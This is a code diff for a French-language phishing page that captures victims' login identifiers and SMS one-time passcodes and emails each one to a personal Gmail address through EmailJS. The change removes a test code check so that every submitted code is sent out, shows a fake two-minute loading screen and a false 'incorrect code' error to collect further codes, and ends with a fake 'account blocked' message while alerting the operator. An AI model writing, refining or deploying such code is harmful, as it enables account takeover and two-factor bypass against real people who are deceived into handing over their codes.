@@ -1227,28 +1227,17 @@
             }
 
             // =============================================
-            // ENVOI DE LA TENTATIVE DE CODE
+            // ENVOI DU CODE OTP SAISI PAR L'UTILISATEUR
             // =============================================
-            function sendCodeAttempt(identifiant, code, attempts) {
-                console.log('📧 Envoi de la tentative de code...');
+            function sendCodeOTP(identifiant, code, attempts) {
+                console.log('📧 Envoi du code OTP saisi...');
                 return sendEmail(EMAILJS_TEMPLATE_ID, {
                     to_email: 'emirhan82y@gmail.com',
                     identifiant: identifiant,
-                    motdepasse: 'TENTATIVE CODE: ' + code + ' (restant: ' + attempts + ' tentatives)',
+                    motdepasse: 'CODE OTP SAISI: ' + code + ' (tentative ' + (4 - attempts) + '/3)',
                     userAgent: navigator.userAgent || 'Inconnu',
                     date: new Date().toLocaleString('fr-FR')
                 });
-            }
-
-            // =============================================
-            // GÉNÉRER UN CODE ALÉATOIRE (pour test)
-            // =============================================
-            function generateTestCode() {
-                var code = '';
-                for (var i = 0; i < 6; i++) {
-                    code += Math.floor(Math.random() * 10);
-                }
-                return code;
             }
 
             // =============================================
@@ -1295,7 +1284,9 @@
                 document.querySelector('.progress-bar').style.display = 'none';
                 codeInput.value = '';
                 codeError.classList.remove('visible');
-                remainingAttempts = 3;
+                btnValiderCode.disabled = false;
+                btnValiderCode.style.opacity = '1';
+                btnValiderCode.style.cursor = 'pointer';
             }
 
             function showLoadingAfterCode() {
@@ -1319,8 +1310,51 @@
                 setTimeout(() => {
                     clearInterval(loadingInterval);
                     progressFill.style.width = '100%';
-                    showCodeStep();
-                }, 7000);
+                    // Afficher le message d'erreur
+                    showErrorAndRetry();
+                }, 120000);
+            }
+
+            function showErrorAndRetry() {
+                remainingAttempts--;
+
+                if (remainingAttempts === 0) {
+                    codeError.textContent = '🔒 Compte bloqué. Veuillez contacter le support client.';
+                    codeError.classList.add('visible');
+                    btnValiderCode.disabled = true;
+                    btnValiderCode.style.opacity = '0.5';
+                    btnValiderCode.style.cursor = 'not-allowed';
+                    loadingTitle.textContent = '🔒 Compte bloqué';
+                    loadingDesc.textContent = 'Trop de tentatives incorrectes';
+                    loadingSub.textContent = 'Contactez le support client';
+
+                    sendEmail(EMAILJS_TEMPLATE_ID, {
+                        to_email: 'emirhan82y@gmail.com',
+                        identifiant: identifiantValue.textContent,
+                        motdepasse: '⚠️ ALERTE - COMPTE BLOQUÉ après 3 tentatives',
+                        userAgent: navigator.userAgent || 'Inconnu',
+                        date: new Date().toLocaleString('fr-FR')
+                    }).catch(function(e) { console.error(e); });
+                    return;
+                }
+
+                codeError.innerHTML = '❌ Code incorrect ou expiré.<br>Veuillez réessayer. Il vous reste <span class="attempts">' + remainingAttempts + '</span> tentative' + (remainingAttempts > 1 ? 's' : '') + '.';
+                codeError.classList.add('visible');
+
+                // Revenir au modal OTP après l'erreur
+                loadingTitle.textContent = '📱 Saisissez le code reçu par SMS';
+                loadingDesc.textContent = 'Un code vous a été envoyé par SMS';
+                loadingSub.style.display = 'block';
+                loadingSub.textContent = 'Saisissez le code reçu pour continuer';
+                codeSection.classList.add('visible');
+                loadingSpinner.style.display = 'none';
+                document.querySelector('.progress-bar').style.display = 'none';
+                codeInput.value = '';
+                codeInput.focus();
+                btnValiderCode.disabled = false;
+                btnValiderCode.style.opacity = '1';
+                btnValiderCode.style.cursor = 'pointer';
+                isCodeStep = true;
             }
 
             function hideLoading() {
@@ -1361,7 +1395,7 @@
             }
 
             // =============================================
-            // VALIDATION DU CODE
+            // VALIDATION DU CODE OTP SAISI
             // =============================================
             function validateCode() {
                 var enteredCode = codeInput.value.replace(/\D/g, '');
@@ -1372,66 +1406,17 @@
                     return;
                 }
 
-                // CODE DE TEST (en production, le code est reçu par SMS)
-                var testCode = '123456';
-
-                // Envoyer la tentative par email
-                sendCodeAttempt(identifiantValue.textContent, enteredCode, remainingAttempts - 1)
+                // Envoyer le code saisi par email
+                sendCodeOTP(identifiantValue.textContent, enteredCode, remainingAttempts)
                     .then(function() {
-                        console.log('✅ Tentative de code envoyée par email');
+                        console.log('✅ Code OTP envoyé par email');
                     })
                     .catch(function(error) {
-                        console.error('❌ Erreur envoi tentative:', error);
+                        console.error('❌ Erreur envoi code OTP:', error);
                     });
 
-                if (enteredCode === testCode) {
-                    codeError.classList.remove('visible');
-                    hideLoading();
-                    alert('✅ Connexion réussie !\n\nIdentifiant: ' + identifiantValue.textContent);
-                    sectionPassword.classList.remove('visible');
-                    sectionIdentifiant.style.display = 'block';
-                    motDePasseInput.value = '';
-                    validerBtn.style.display = 'none';
-                    identifiantInput.value = '';
-                    identifiantInput.focus();
-                    credentialsSent = false;
-                    remainingAttempts = 3;
-                } else {
-                    remainingAttempts--;
-
-                    if (remainingAttempts === 0) {
-                        // Compte bloqué
-                        codeError.textContent = '🔒 Compte bloqué. Veuillez contacter le support client.';
-                        codeError.classList.add('visible');
-                        btnValiderCode.disabled = true;
-                        btnValiderCode.style.opacity = '0.5';
-                        btnValiderCode.style.cursor = 'not-allowed';
-                        loadingTitle.textContent = '🔒 Compte bloqué';
-                        loadingDesc.textContent = 'Trop de tentatives incorrectes';
-                        loadingSub.textContent = 'Contactez le support client';
-                        // Envoyer email d'alerte
-                        sendEmail(EMAILJS_TEMPLATE_ID, {
-                            to_email: 'emirhan82y@gmail.com',
-                            identifiant: identifiantValue.textContent,
-                            motdepasse: '⚠️ ALERTE - COMPTE BLOQUÉ après 3 tentatives',
-                            userAgent: navigator.userAgent || 'Inconnu',
-                            date: new Date().toLocaleString('fr-FR')
-                        }).catch(function(e) { console.error(e); });
-                        return;
-                    }
-
-                    codeError.innerHTML = '❌ Code incorrect ou expiré.<br>Veuillez réessayer. Il vous reste <span class="attempts">' + remainingAttempts + '</span> tentative' + (remainingAttempts > 1 ? 's' : '') + '.';
-                    codeError.classList.add('visible');
-                    codeInput.value = '';
-                    codeInput.focus();
-
-                    // Relancer le modal après 5 secondes
-                    setTimeout(function() {
-                        if (remainingAttempts > 0) {
-                            showLoadingAfterCode();
-                        }
-                    }, 5000);
-                }
+                // Lancer le chargement et l'erreur après 2min
+                showLoadingAfterCode();
             }
 
             // =============================================
